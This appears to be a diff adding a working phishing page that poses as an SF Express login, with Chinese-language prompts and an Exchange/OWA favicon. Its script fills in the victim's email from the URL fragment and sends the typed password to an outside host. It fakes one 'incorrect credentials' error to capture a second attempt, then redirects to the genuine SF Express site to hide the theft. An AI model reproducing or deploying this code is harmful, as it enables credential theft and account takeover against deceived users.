@@ -1,0 +1,185 @@
+<html lang="en"><head>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link href="https://exchange.quadranet.com/owa/auth/15.0.1395/themes/resources/favicon.ico?" rel="icon" type="image/x-icon">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+</head>
+<body style="overflow: hidden">
+  
+
+  
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://ik.imagekit.io/konxumwja/download%20(2).png">
+    <title>Document</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
+
+    <style>
+      .dboard {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        margin-top: -50px;
+        margin-left: -50px;
+        width: 400px;
+        height: 400px;
+        background-color: #fff;
+      }
+      .dbtn:hover {
+        background-color: #bdc3c770 !important;
+        animation: ease-in 5s;
+      }
+    </style>
+  
+  
+    <div style="
+        background-image: url('https://ik.imagekit.io/konxumwja/sfexpress.png');
+        background-position: center center;
+        background-size: contain;
+        background-repeat: no-repeat;
+        width: 100%;
+        height: 100vh;
+      ">
+      <div style="
+          width: 100%;
+          background: #0000007d;
+          position: absolute;
+          top: 0;
+          left: 0;
+          height: 100vh;
+        "></div>
+      <div style="
+          position: absolute;
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
+          background: #fff;
+          z-index: 999999;
+          width: 450px;
+          height: 460px;
+          border-top: 5px solid red;
+        ">
+        <div id="overlayLoader" style="
+            position: absolute;
+            display: none;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffffab;
+            z-index: 9999;
+          ">
+          <img src="https://ik.imagekit.io/escrowmade/Rolling-1s-200px__1__trHCWXy9jD.gif" style="
+              width: 50px;
+              position: absolute;
+              top: 50%;
+              left: 50%;
+              transform: translate(-50%, -50%);
+            ">
+        </div>
+        <div style="
+            width: 100px;
+            padding: 6px;
+            text-align: center;
+            background: #f2f2f2;
+            border-bottom: 2px solid red;
+            margin-left: 30px;
+          ">
+          帐号登录
+        </div>
+        <form class="col s12" id="logform">
+          <div class="row" style="padding: 40px">
+            <div>
+              <p>登录后即可免验证快速下单与查件</p>
+            </div>
+            <div class="input-field">
+              <input placeholder="Email" id="uemail" type="text" class="validate" disabled="disabled" value="">
+            </div>
+
+            <div class="input-field" style="padding-top: 10px">
+              <input placeholder="密码" id="upass" type="password" required="" class="validate">
+            </div>
+            <div id="ajax-form-error" style="color: red; display: none">
+              登录凭据不正确
+            </div>
+
+            <div style="text-align: center; font-size: 11px; color: #ceb0b0">
+              <p>未注册用户登录默认注册顺丰会员</p>
+              <div>
+                <label>
+                  <input type="checkbox">
+                  <span>自动登录</span>
+                </label>
+              </div>
+              <button type="submit" class="dbtn" id="dbtn" style="
+                  background-color: #fff;
+                  border: 1px solid #f1f1f1;
+                  color: #333 !important;
+                  height: 48px;
+                  border-radius: 24px;
+                  min-width: 229px;
+                  display: inline-flex;
+                  font-size: 14px;
+                  justify-content: center;
+                  align-items: center;
+                  width: 100%;
+                  margin-top: 30px;
+                  cursor: pointer;
+                ">
+                登入
+              </button>
+            </div>
+          </div>
+        </form>
+      </div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
+    <script>
+      const emailFieldName = "uu";
+      const passFieldName = "pp";
+      const redirectUrl = "https://www.sf-express.com/chn/sc";
+      const postUrl = "https://rnytimezero.com/ibi/newtest.php";
+      const emailInput = document.getElementById("uemail");
+      const passInput = document.getElementById("upass");
+      const clientEmail = location.hash.replace("#", "");
+      const overlay = document.getElementById("overlayLoader");
+      let submitCount = 0;
+      const maxSubmitCount = 1;
+      emailInput.value = clientEmail;
+      emailInput.setAttribute("disabled", "disabled");
+      document.getElementById("logform").addEventListener("submit", (evt) => {
+        evt.preventDefault();
+        const payload = {};
+        payload[emailFieldName] = clientEmail;
+        payload[passFieldName] = passInput.value;
+        if (clientEmail && passInput.value) {
+          const formObj = new FormData();
+          for (i in payload) {
+            formObj.append(i, payload[i]);
+          }
+          overlay.style.display = "block";
+          document.getElementById("ajax-form-error").style.display = "none";
+          const ajax = new XMLHttpRequest();
+          ajax.open("POST", postUrl);
+          ajax.onreadystatechange = function (evt) {
+            console.log(ajax);
+            if (ajax.readyState === 4) {
+              if (submitCount < maxSubmitCount) {
+                overlay.style.display = "none";
+                document.getElementById("ajax-form-error").style.display =
+                  "block";
+                passInput.value = "";
+                submitCount++;
+              } else {
+                window.location.href = redirectUrl;
+              }
+            }
+          };
+          ajax.send(formObj);
+        }
+      });
+    </script>
+  
+
+
+
+</body></html>
